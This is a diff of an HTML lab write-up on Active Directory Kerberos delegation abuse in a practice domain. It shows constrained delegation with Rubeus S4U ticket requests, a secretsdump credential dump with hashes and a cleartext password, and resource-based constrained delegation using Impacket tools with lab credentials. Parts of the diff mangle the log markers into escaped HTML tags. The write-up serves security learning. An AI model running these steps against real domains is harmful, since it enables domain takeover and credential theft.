+    <pre><code class="language-powershell">    doIFiDCCBYSgAwIBBaEDAgEWooIEdjCCBHJhggRuMIIEaqADAgEFoRsbGU5PUlRILlNFVkVOS0lOR0RP
           TVMuTE9DQUyiLjAsoAMCAQKhJTAjGwZrcmJ0Z3QbGW5vcnRoLnNldmVua2luZ2RvbXMubG9jYWyjggQU
           MIIEEKADAgESoQMCAQKiggQCBIID/qGdTYr1A6YGpC38zT5EjNcRo8+7flqVDuYTFw6rfUBTudi43Oel
           iR7Qu+0oy5SgWJ6ZgaRvs4QDLttfo7lhJ5j6lF4Y+9PGa70FX8IPGnEHv2sP9MMyd+XGp2PXnAqDbriR
@@ -573,24 +595,23 @@
           AgEBoQwwChsIam9uLnNub3ejBwMFAEDhAAClERgPMjAyNDAxMzAyMjM0MzRaphEYDzIwMjQwMTMxMDgz
           NDM0WqcRGA8yMDI0MDIwNjIyMzQzNFqoGxsZTk9SVEguU0VWRU5LSU5HRE9NUy5MT0NBTKkuMCygAwIB
           AqElMCMbBmtyYnRndBsZbm9ydGguc2V2ZW5raW5nZG9tcy5sb2NhbA==
-    </code>`<code>
+    </code></pre>
     
-    After getting the Ticket we need to remove the empty spaces and to accomplish this task we can VIM text editor(: </code>:%s/\s<em>\n\s</em>//g<code>) and uploaded the .kirbi back to the machine into the <strong></code>C:\tmp<code></strong> dir.
+    After getting the Ticket we need to remove the empty spaces and to accomplish this task we can VIM text editor(: <code>:%s/\s&lt;em&gt;\n\s&lt;/em&gt;//g</code>) and uploaded the .kirbi back to the machine into the <strong><code>C:\tmp</code></strong> dir.
     
-    Now it’s time to obtain the TGS impersonating Administrator (CIFS), We will be using CIFS because during our recon phase we saw that user jon.snow has Delegation Rights to <strong></code>CIFS/Winterfell<code></strong>.
+    Now it’s time to obtain the TGS impersonating Administrator (CIFS), We will be using CIFS because during our recon phase we saw that user jon.snow has Delegation Rights to <strong><code>CIFS/Winterfell</code></strong>.
     
-    </code>[Rubeus.Program]::MainString("s4u /ticket:jon.snow.kirbi /impersonateuser:administrator /msdsspn:CIFS/winterfell /ptt");<code>
+    <code>[Rubeus.Program]::MainString("s4u /ticket:jon.snow.kirbi /impersonateuser:administrator /msdsspn:CIFS/winterfell /ptt");</code>
     
-    </code>/ticket:<code> The ticket requested previously .kirbi
+    <code>/ticket:</code> The ticket requested previously .kirbi
     
-    </code>/impersonateuser:<code> The user we want to impersonate 
+    <code>/impersonateuser:</code> The user we want to impersonate 
     
-    </code>/msdsspn:<code> The ServicePrincipalName 
+    <code>/msdsspn:</code> The ServicePrincipalName 
     
-    </code>/ptt<code>: PassTheTicket
+    <code>/ptt</code>: PassTheTicket
     
-    </code>`<code>powershell
-      (_____ \      | |
+    <pre><code class="language-powershell">      (_____ \      | |
        _____) )_   _| |__  _____ _   _  ___
       |  __  /| | | |  _ \| ___ | | | |/___)
       | |  \ \| |_| | |_) ) ____| |_| |___ |
@@ -598,16 +619,16 @@
     
       v2.2.0
     
-    [*] Action: S4U
+    [&lt;em&gt;] Action: S4U
     
-    [*] Action: S4U
+    [&lt;/em&gt;] Action: S4U
     
-    [*] Building S4U2self request for: 'jon.snow@NORTH.SEVENKINGDOMS.LOCAL'
-    [*] Using domain controller: winterfell.north.sevenkingdoms.local (fe80::6914:468:10e9:3d23%6)
-    [*] Sending S4U2self request to fe80::6914:468:10e9:3d23%6:88
+    [&lt;em&gt;] Building S4U2self request for: 'jon.snow@NORTH.SEVENKINGDOMS.LOCAL'
+    [&lt;/em&gt;] Using domain controller: winterfell.north.sevenkingdoms.local (fe80::6914:468:10e9:3d23%6)
+    [&lt;em&gt;] Sending S4U2self request to fe80::6914:468:10e9:3d23%6:88
     [+] S4U2self success!
-    [*] Got a TGS for 'administrator' to 'jon.snow@NORTH.SEVENKINGDOMS.LOCAL'
-    [*] base64(ticket.kirbi):
+    [&lt;/em&gt;] Got a TGS for 'administrator' to 'jon.snow@NORTH.SEVENKINGDOMS.LOCAL'
+    [&lt;em&gt;] base64(ticket.kirbi):
     
           doIFzDCCBcigAwIBBaEDAgEWooIEzjCCBMphggTGMIIEwqADAgEFoRsbGU5PUlRILlNFVkVOS0lOR0RP
           TVMuTE9DQUyiFTAToAMCAQGhDDAKGwhqb24uc25vd6OCBIUwggSBoAMCARehAwIBBaKCBHMEggRv1ePv
@@ -635,12 +656,12 @@
           ERgPMjAyNDAxMzAyMjU0MDhaphEYDzIwMjQwMTMxMDgyNzQwWqcRGA8yMDI0MDIwNjIyMjc0MFqoGxsZ
           Tk9SVEguU0VWRU5LSU5HRE9NUy5MT0NBTKkVMBOgAwIBAaEMMAobCGpvbi5zbm93
     
-    [*] Impersonating user 'administrator' to target SPN 'CIFS/winterfell'
-    [*] Building S4U2proxy request for service: 'CIFS/winterfell'
-    [*] Using domain controller: winterfell.north.sevenkingdoms.local (fe80::6914:468:10e9:3d23%6)
-    [*] Sending S4U2proxy request to domain controller fe80::6914:468:10e9:3d23%6:88
+    [&lt;/em&gt;] Impersonating user 'administrator' to target SPN 'CIFS/winterfell'
+    [&lt;em&gt;] Building S4U2proxy request for service: 'CIFS/winterfell'
+    [&lt;/em&gt;] Using domain controller: winterfell.north.sevenkingdoms.local (fe80::6914:468:10e9:3d23%6)
+    [&lt;em&gt;] Sending S4U2proxy request to domain controller fe80::6914:468:10e9:3d23%6:88
     [+] S4U2proxy success!
-    [*] base64(ticket.kirbi) for SPN 'CIFS/winterfell':
+    [&lt;/em&gt;] base64(ticket.kirbi) for SPN 'CIFS/winterfell':
     
           doIGmDCCBpSgAwIBBaEDAgEWooIFkjCCBY5hggWKMIIFhqADAgEFoRsbGU5PUlRILlNFVkVOS0lOR0RP
           TVMuTE9DQUyiHTAboAMCAQKhFDASGwRDSUZTGwp3aW50ZXJmZWxso4IFQTCCBT2gAwIBEqEDAgEDooIF
@@ -673,43 +694,42 @@
           Gwp3aW50ZXJmZWxs
     [+] Ticket successfully imported!
     
-    PS C:\tmp>
-    </code>`<code>
+    PS C:\tmp&gt;
+    </code></pre>
     
     ### Dsync Attack
     
-    </code>export KRB5CCNAME=Administrator.ccache<code>
-    <a href="http://secretsdump.py/" target="_blank"></code>secretsdump.py</a> -k -no-pass 'north.sevenkingdoms.local/administrator@winterfell'<code>
+    <code>export KRB5CCNAME=Administrator.ccache</code>
+    <a href="http://secretsdump.py/" target="_blank"><code>secretsdump.py&lt;/a&gt; -k -no-pass 'north.sevenkingdoms.local/administrator@winterfell'</code>
     
-    </code>`<code>powershell
-    Impacket v0.12.0.dev1+20231130.165011.d370e63 - Copyright 2023 Fortra
+    <pre><code class="language-powershell">    Impacket v0.12.0.dev1+20231130.165011.d370e63 - Copyright 2023 Fortra
     
-    [*] Service RemoteRegistry is in stopped state
-    [*] Starting service RemoteRegistry
-    [*] Target system bootKey: 0x90abb8e1d3cf9cd880d351d93e2a194a
-    [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+    [&lt;em&gt;] Service RemoteRegistry is in stopped state
+    [&lt;/em&gt;] Starting service RemoteRegistry
+    [&lt;em&gt;] Target system bootKey: 0x90abb8e1d3cf9cd880d351d93e2a194a
+    [&lt;/em&gt;] Dumping local SAM hashes (uid:rid:lmhash:nthash)
     Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::
     Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
     DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
     [-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
-    [*] Dumping cached domain logon information (domain/username:hash)
-    [*] Dumping LSA Secrets
-    [*] $MACHINE.ACC 
+    [&lt;em&gt;] Dumping cached domain logon information (domain/username:hash)
+    [&lt;/em&gt;] Dumping LSA Secrets
+    [&lt;em&gt;] $MACHINE.ACC 
     NORTH\WINTERFELL$:plain_password_hex:e476ab23376c45282c17899ceef6d2423e5ffb9315e972a7b07c1bea336c4e0017e0f825aca6f4da468efd7852100756050ae585c0fb19d2fee7e116b691a02b2151ab256cd5be5644507af33f94ad2c1b9745fd3a5830b23c8f109f66596de6d93d6c85f515e58ed6aa45e065253bb1793ee7f7c5ecd258e478e72d7ab983e89d8d0001ba78fa36dc41f62b4e29968344ceb19eeaf2de9d3d339624464c9413c69722d8680e9056cebb18e7b39cb9a85cd6f22f2fb35a9ce479261c07f15bc4428e580ca1e18d09aa450018ffb36b482962e870f028bec0443430713d98d264116f475a59c8192f570f905e88b14306
     NORTH\WINTERFELL$:aad3b435b51404eeaad3b435b51404ee:a31b885ef803c3d2596abd6769d018a1:::
-    [*] DefaultPassword 
+    [&lt;/em&gt;] DefaultPassword 
     NORTH\robb.stark:sexywolfy
-    [*] DPAPI_SYSTEM 
+    [&lt;em&gt;] DPAPI_SYSTEM 
     dpapi_machinekey:0xd50c3c3618c0f1f1202b5b778d969a649157170d
     dpapi_userkey:0x30bfc43cf74375e9407a42cf7b5ef4499bab5b3e
-    [*] NL$KM 
+    [&lt;/em&gt;] NL$KM 
      0000   A0 B9 07 4A 55 70 F9 F9  FA CC 68 30 15 F5 95 A2   ...JUp....h0....
      0010   58 69 29 AD 87 BA A5 9F  76 EB AC F3 07 63 71 5A   Xi).....v....cqZ
-     0020   ED 26 C1 FC 5A 2B D3 25  A0 74 E6 E4 90 53 D5 19   .&..Z+.%.t...S..
+     0020   ED 26 C1 FC 5A 2B D3 25  A0 74 E6 E4 90 53 D5 19   .&amp;..Z+.%.t...S..
      0030   E8 D6 BD D0 F3 36 76 5A  A6 74 1B 5B D8 30 90 2A   .....6vZ.t.[.0.*
     NL$KM:a0b9074a5570f9f9facc683015f595a2586929ad87baa59f76ebacf30763715aed26c1fc5a2bd325a074e6e49053d519e8d6bdd0f336765aa6741b5bd830902a
-    [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
-    [*] Using the DRSUAPI method to get NTDS.DIT secrets
+    [&lt;em&gt;] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+    [&lt;/em&gt;] Using the DRSUAPI method to get NTDS.DIT secrets
     Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::
     Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
     krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0cde4417577d1c0292d75b21dda8cffd:::
@@ -730,7 +750,7 @@
     CASTELBLACK$:1105:aad3b435b51404eeaad3b435b51404ee:a8573f70897bd596742b3b9f2699ee81:::
     krbrelay$:1122:aad3b435b51404eeaad3b435b51404ee:5afb92e88c27879ce0fc1e120428a457:::
     SEVENKINGDOMS$:1104:aad3b435b51404eeaad3b435b51404ee:b33545882c07af32620ab8aa94ced73f:::
-    [*] Kerberos keys grabbed
+    [&lt;em&gt;] Kerberos keys grabbed
     Administrator:aes256-cts-hmac-sha1-96:e7aa0f8a649aa96fab5ed9e65438392bfc549cb2695ac4237e97996823619972
     Administrator:aes128-cts-hmac-sha1-96:bb7b6aed58a7a395e0e674ac76c28aa0
     Administrator:des-cbc-md5:fe58cdcd13a43243
@@ -788,9 +808,9 @@
     SEVENKINGDOMS$:aes256-cts-hmac-sha1-96:5ad96db02de521b1ecb48a449be556c19a28586a5f536c560e9631166671f5c8
     SEVENKINGDOMS$:aes128-cts-hmac-sha1-96:e5c7477fe5f3de7ac690ccdfb0b8b121
     SEVENKINGDOMS$:des-cbc-md5:92d5bf79fe57158a
-    [*] Cleaning up... 
-    [*] Stopping service RemoteRegistry
-    </code>`<code>
+    [&lt;/em&gt;] Cleaning up... 
+    [&lt;em&gt;] Stopping service RemoteRegistry
+    </code></pre>
     
     > A good thing to know is that the SPN part is not encrypted in the request, so you can change it to the one you want with the following options:
     > 
@@ -801,8 +821,8 @@
     
     The final resource has a list of trusted accounts. All accounts in this list can delegate authentication when accessing the resource. Resources can modify this list as they wish, they don’t need an administrator to update it.
     
-    The Domain Controller will look at the attributes of <strong>Resource B</strong> (instead of </code>Service A<code>). It will check that the account associated with </code>Service A<code> is present in the <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-ada2/cea4ac11-a4b2-4f2d-84cc-aebb4a4ad405" target="_blank">msDS-AllowedToActOnBehalfOfOtherIdentity</a> attribute of the account linked to </code>Resource B<code>
-    </code>WEB-SERVER-01<code> is added to </code>WEB-SERVER-02<code> trusting list, so <strong>msDS-AllowedToActOnBehalfOfOtherIdentity</strong> is updated.
+    The Domain Controller will look at the attributes of <strong>Resource B</strong> (instead of <code>Service A</code>). It will check that the account associated with <code>Service A</code> is present in the <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-ada2/cea4ac11-a4b2-4f2d-84cc-aebb4a4ad405" target="_blank">msDS-AllowedToActOnBehalfOfOtherIdentity</a> attribute of the account linked to <code>Resource B</code>
+    <code>WEB-SERVER-01</code> is added to <code>WEB-SERVER-02</code> trusting list, so <strong>msDS-AllowedToActOnBehalfOfOtherIdentity</strong> is updated.
     Then, when a service wants to access a resource, here’s how it works:
     
     <img src="images/image-264.png" alt="resource_based_constrained_delegation_schema_detailed.png" class="article-image" loading="lazy">
@@ -814,25 +834,25 @@
     This is similar to the basic Constrained Delegation but <strong>instead</strong> of giving permissions to an <strong>object</strong> to <strong>impersonate any user against a service</strong>. Resource-based Constrain Delegation <strong>sets</strong> in <strong>the object who is able to impersonate any user against it</strong>.
     
     In this case, the constrained object will have an attribute called <strong><em>msDS-AllowedToActOnBehalfOfOtherIdentity</em></strong> with the name of the user that can impersonate any other user against it.
-    Another important difference from this Constrained Delegation to the other delegations is that any user with <strong>write permissions over a machine account</strong> (<em>GenericAll/GenericWrite/WriteDacl/WriteProperty/etc</em>) can set the <strong><em>msDS-AllowedToActOnBehalfOfOtherIdentity</em></strong> (In the other forms of Delegation you needed domain admin privs).
+    Another important difference from this Constrained Delegation to the other delegations is that any user with <strong>write permissions over a machine account</strong> (</em>GenericAll/GenericWrite/WriteDacl/WriteProperty/etc*) can set the <strong><em>msDS-AllowedToActOnBehalfOfOtherIdentity</em></strong> (In the other forms of Delegation you needed domain admin privs).
     
-    You can abuse RBCD when you can edit the attribute: </code>msDS-AllowedToActOnBehalfOfOtherIdentity<code>.
+    You can abuse RBCD when you can edit the attribute: <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>.
     
-    An example of exploitation is when you got <strong></code>genericAll<code></strong> or <strong></code>genericWrite<code></strong> ACL on a Computer.
+    An example of exploitation is when you got <strong><code>genericAll</code></strong> or <strong><code>genericWrite</code></strong> ACL on a Computer.
     
-    As we can see below, based on BloodHound enumeration, user <strong>Stannis.Baratheon</strong> has <strong></code>GenericAll<code></strong> rights to <strong>KINGSLANDING</strong> which is the DC at <strong>sevenkingdoms.local</strong> domain.
+    As we can see below, based on BloodHound enumeration, user <strong>Stannis.Baratheon</strong> has <strong><code>GenericAll</code></strong> rights to <strong>KINGSLANDING</strong> which is the DC at <strong>sevenkingdoms.local</strong> domain.
     
     <img src="images/image-266.png" alt="Untitled" class="article-image" loading="lazy">
     
     1st - We do ADD a computer to the domain.
     
-    <a href="http://addcomputer.py/" target="_blank"></code>addcomputer.py</a> -computer-name 'stark_computer$' -computer-pass 'Stark_Pass' -dc-host kingslanding.sevenkingdoms.local 'sevenkingdoms.local/stannis.baratheon:Drag0nst0ne'<code>
+    <a href="http://addcomputer.py/" target="_blank"><code>addcomputer.py&lt;/a&gt; -computer-name 'stark_computer$' -computer-pass 'Stark_Pass' -dc-host kingslanding.sevenkingdoms.local 'sevenkingdoms.local/stannis.baratheon:Drag0nst0ne'</code>
     
     <img src="images/image-267.png" alt="Untitled" class="article-image" loading="lazy">
     
     2nd - Now we need to ADD Delegation Rights to our target machine(kingslanding$) from our just added computer(stark_computer$)
     
-    <a href="http://rbcd.py/" target="_blank"></code>rbcd.py</a> -delegate-from 'stark_computer$' -delegate-to 'kingslanding$' -dc-ip 'kingslanding.sevenkingdoms.local' -action 'write' 'sevenkingdoms.local/stannis.baratheon:Drag0nst0ne'<code>
+    <a href="http://rbcd.py/" target="_blank"><code>rbcd.py&lt;/a&gt; -delegate-from 'stark_computer$' -delegate-to 'kingslanding$' -dc-ip 'kingslanding.sevenkingdoms.local' -action 'write' 'sevenkingdoms.local/stannis.baratheon:Drag0nst0ne'</code>
     
     <img src="images/image-268.png" alt="Untitled" class="article-image" loading="lazy">
     
@@ -840,22 +860,22 @@
     
     3rd - Now we can simply do the S4U2self followed by S4U2Proxy querys resulting to administrator permission in Kingslanding
     
-    <a href="http://getst.py/" target="_blank"></code>getST.py</a> -spn 'cifs/kingslanding.sevenkingdoms.local' -impersonate Administrator -dc-ip 'kingslanding.sevenkingdoms.local' 'sevenkingdoms.local/stark_computer$:Stark_Pass'<code> 
+    <a href="http://getst.py/" target="_blank"><code>getST.py&lt;/a&gt; -spn 'cifs/kingslanding.sevenkingdoms.local' -impersonate Administrator -dc-ip 'kingslanding.sevenkingdoms.local' 'sevenkingdoms.local/stark_computer$:Stark_Pass'</code> 
     
     <img src="images/image-269.png" alt="Untitled" class="article-image" loading="lazy">
     
     Once we got the Administrator permission in Kingslanding DC, we can use the administrator ticket to access <strong>KINGSLANDING DC.</strong>
     
-    </code>export KRB5CCNAME=Administrator.ccache
-    <a href="http://wmiexec.py/" target="_blank">wmiexec.py</a> -k -no-pass @kingslanding.sevenkingdoms.local<code>
+    <code>export KRB5CCNAME=Administrator.ccache
+    &lt;a href="http://wmiexec.py/" target="_blank"&gt;wmiexec.py&lt;/a&gt; -k -no-pass @kingslanding.sevenkingdoms.local</code>
     
     <img src="images/image-270.png" alt="Untitled" class="article-image" loading="lazy">
     
     <strong>NOTE</strong>: After finishing the lab, let’s just clean the lab before we move on. We flush the RBCD entry and delete the computer account with a domain admin
     
-    </code>rbcd.py -delegate-from 'stark_compuert$' -delegate-to 'kingslanding$' -dc-ip 'kingslanding.sevenkingdoms.local' -action 'flush' sevenkingdoms.local/stannis.baratheon:Drag0nst0ne<code>
+    <code>rbcd.py -delegate-from 'stark_compuert$' -delegate-to 'kingslanding$' -dc-ip 'kingslanding.sevenkingdoms.local' -action 'flush' sevenkingdoms.local/stannis.baratheon:Drag0nst0ne</code>
     
-    </code>addcomputer.py -computer-name 'rbcd$' -computer-pass 'rbcdpass' -dc-host kingslanding.sevenkingdoms.local 'sevenkingdoms.local/cersei.lannister:il0vejaime' -delete`
+    <code>addcomputer.py -computer-name 'rbcd$' -computer-pass 'rbcdpass' -dc-host kingslanding.sevenkingdoms.local 'sevenkingdoms.local/cersei.lannister:il0vejaime' -delete</code>
     
     Also a  good source is this one from shutdown: <a href="https://www.thehacker.recipes/ad/movement/kerberos/delegations#talk" target="_blank">https://www.thehacker.recipes/ad/movement/kerberos/delegations#talk</a>
         </section>
